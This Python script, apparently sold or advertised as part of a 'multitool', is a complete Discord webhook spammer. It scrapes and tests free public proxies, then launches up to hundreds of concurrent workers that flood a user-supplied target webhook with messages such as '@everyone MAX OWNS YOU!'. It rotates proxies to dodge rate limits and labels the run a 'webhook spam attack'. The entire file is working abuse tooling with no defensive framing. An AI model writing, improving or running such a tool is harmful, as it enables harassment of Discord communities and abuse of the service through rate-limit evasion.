import asyncio
import aiohttp
import aiohttp.client_exceptions
import random
import requests
from bs4 import BeautifulSoup
import threading
import time
from queue import Queue
import json
from colorama import Fore

phantomspammerbanner = f"""{Fore.BLUE}
██████╗ ██╗  ██╗ █████╗ ███╗   ██╗████████╗ ██████╗ ███╗   ███╗
██╔══██╗██║  ██║██╔══██╗████╗  ██║╚══██╔══╝██╔═══██╗████╗ ████║
██████╔╝███████║███████║██╔██╗ ██║   ██║   ██║   ██║██╔████╔██║
██╔═══╝ ██╔══██║██╔══██║██║╚██╗██║   ██║   ██║   ██║██║╚██╔╝██║
██║     ██║  ██║██║  ██║██║ ╚████║   ██║   ╚██████╔╝██║ ╚═╝ ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝
                    made by @rp9y  
    github: https://github.com/rp9y/                                                                             
    discord: @rp9y  
   
       DM TO BUY MORE MULTITOOLS WITH MORE FUNCTIONS                                                                              
"""

class ProxyScraper:
    def __init__(self):
        self.proxy_sources = [
            'https://www.sslproxies.org/',
            'https://free-proxy-list.net/',
            'https://us-proxy.org/',
            'https://www.proxynova.com/proxy-server-list/'
        ]
    
    def scrape_proxies(self):
        proxies = []
        for source in self.proxy_sources:
            try:
                response = requests.get(source, timeout=10)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                if 'sslproxies' in source or 'free-proxy' in source:
                    table = soup.find('table', {'class': 'table table-striped table-bordered'})
                    if table:
                        for row in table.find_all('tr')[1:101]:
                            cols = row.find_all('td')
                            if len(cols) >= 2:
                                ip = cols[0].text.strip()
                                port = cols[1].text.strip()
                                proxies.append(f"http://{ip}:{port}")
                
                elif 'proxynova' in source:
                    table = soup.find('table', {'id': 'tbl_proxy_list'})
                    if table:
                        for row in table.find_all('tr')[1:101]:
                            cols = row.find_all('td')
                            if len(cols) >= 2:
                                ip_script = cols[0].find('script')
                                if ip_script:
                                    ip_text = ip_script.text
                                    ip = ip_text.split("'")[1] if "'" in ip_text else cols[0].text.strip()
                                    port = cols[1].text.strip()
                                    proxies.append(f"http://{ip}:{port}")
            except:
                continue
        
        return list(set(proxies))

class ProxyRotator:
    def __init__(self, proxies):
        self.proxies = proxies
        self.current_index = 0
        self.lock = threading.Lock()
        self.working_proxies = []
        self.test_proxies()
    
    def test_proxies(self):
        def test_proxy(proxy):
            try:
                test_url = "http://httpbin.org/ip"
                response = requests.get(test_url, proxies={"http": proxy, "https": proxy}, timeout=5)
                if response.status_code == 200:
                    self.working_proxies.append(proxy)
            except:
                pass
        
        threads = []
        for proxy in self.proxies:
            t = threading.Thread(target=test_proxy, args=(proxy,))
            t.start()
            threads.append(t)
        
        for t in threads:
            t.join()
    
    def get_proxy(self):
        with self.lock:
            if not self.working_proxies:
                return None
            proxy = self.working_proxies[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.working_proxies)
            return proxy

class WebhookSpammer:
    def __init__(self, webhook_url, proxy_rotator, message_content, num_threads=50):
        self.webhook_url = webhook_url
        self.proxy_rotator = proxy_rotator
        self.message_content = message_content
        self.num_threads = num_threads
        self.queue = Queue()
        self.sent_count = 0
        self.running = False
        self.lock = threading.Lock()
    
    async def send_webhook_async(self, session, proxy):
        payload = {
            "content": self.message_content,
            "username": f"MAXS SPAMMER",
            "avatar_url": "https://cdn.discordapp.com/embed/avatars/0.png"
        }
        
        try:
            async with session.post(
                self.webhook_url,
                json=payload,
                proxy=proxy if proxy else None,
                timeout=aiohttp.ClientTimeout(total=5)
            ) as response:
                if response.status == 204:
                    with self.lock:
                        self.sent_count += 1
                        if self.sent_count % 100 == 0:
                            print(f"Sent {self.sent_count} webhooks so far...")
                    return True
        except:
            pass
        return False
    
    async def worker(self):
        async with aiohttp.ClientSession() as session:
            while self.running:
                proxy = self.proxy_rotator.get_proxy()
                await self.send_webhook_async(session, proxy)
                await asyncio.sleep(0.01)
    
    def start_spam(self):
        self.running = True
        self.sent_count = 0
        
        async def run_workers():
            tasks = []
            for _ in range(self.num_threads):
                task = asyncio.create_task(self.worker())
                tasks.append(task)
            await asyncio.gather(*tasks)
        
        asyncio.run(run_workers())
    
    def stop_spam(self):
        self.running = False

def get_user_input():
    print(phantomspammerbanner)
    
    webhook_url = input("Enter target webhook URL: ").strip()
    if not webhook_url:
        print("Webhook URL is required!")
        exit()
    
    try:
        thread_count = int(input("Enter number of threads (50-1000 recommended use 50): ").strip() or "100")
    except:
        thread_count = 100
    
    message_content = input("Enter message to spam: ").strip()
    if not message_content:
        message_content = "@everyone MAX OWNS YOU!"
    
    return webhook_url, thread_count, message_content

def main():
    webhook_url, thread_count, message_content = get_user_input()
    
    print("\n" + "="*50)
    print("Scraping proxies from multiple sources...")
    scraper = ProxyScraper()
    raw_proxies = scraper.scrape_proxies()
    print(f"Found {len(raw_proxies)} raw proxies")
    
    print("Testing proxies for validity...")
    rotator = ProxyRotator(raw_proxies)
    print(f"{len(rotator.working_proxies)} working proxies ready")
    
    if len(rotator.working_proxies) == 0:
        print("No working proxies found! Continuing without proxies...")
    
    print("\nStarting webhook spam attack...")
    print("Press CTRL+C to stop the attack")
    print("="*50 + "\n")
    
    spammer = WebhookSpammer(webhook_url, rotator, message_content, thread_count)
    
    try:
        spammer.start_spam()
    except KeyboardInterrupt:
        spammer.stop_spam()
        print(f"\nAttack stopped! Total webhooks sent: {spammer.sent_count}")
    except Exception as e:
        print(f"Error occurred: {e}")
    finally:
        spammer.stop_spam()

if __name__ == "__main__":
    main()

